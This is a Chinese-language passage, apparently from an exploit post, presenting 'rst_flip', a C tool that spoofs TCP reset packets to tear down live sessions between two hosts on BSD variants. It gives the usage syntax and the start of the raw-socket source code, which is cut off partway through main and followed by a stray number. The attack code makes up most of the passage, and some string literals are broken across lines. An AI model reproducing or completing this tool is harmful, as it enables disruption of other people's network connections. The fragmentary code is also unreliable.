
黑客状态：严重拥塞。

易受攻击性：BSD 的各种变体。

攻击方式：使用方法相当简单：

```
rst_flip <A> <B> <A port low> <A port hi> <B port low> <B port hi>
其中
A 和 B 是目标当前的会话。
```

## rst_flip.c

```c
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <linux/socket.h>
#include <linux/ip.h>
#include <linux/tcp.h>

#define TCPHDR    sizeof(struct tcphdr)
#define IPHDR     sizeof(struct iphdr)
#define PACKETSIZE TCPHDR + IPHDR
#define SLEEPTIME 30000             // 取决于你能多快地“呕吐”（发送数据）
#define LO_RST    1                 // 发出的数据包
#define HI_RST    2147483647        // 别问我关于这个 :)
#define ERROR_FAILURE -1

#define ERROR_SUCCESS 0

void resolve_address(struct sockaddr *, char *, u_short);
unsigned short in_cksum(unsigned short *,int );
int send_rst(char *, char *, u_short ,u_short , u_long, u_long,u_long);

int main(int argc, char *argv[])
{
   int res,i,j;
   int spoof_port,target_port;

   if (argc < 7 || argc> 8 )
   {
      printf ("usage: <source> <destination> <source_port_hi>
<source_port_lo> <dest_port_hi> <dest_port_lo>\n[
http://www.rootshell.com/ \n");
      exit(ERROR_FAILURE);
   }

   for (i = atoi(argv[3]);i <= atoi(argv[4]); i++)
   {
```

503
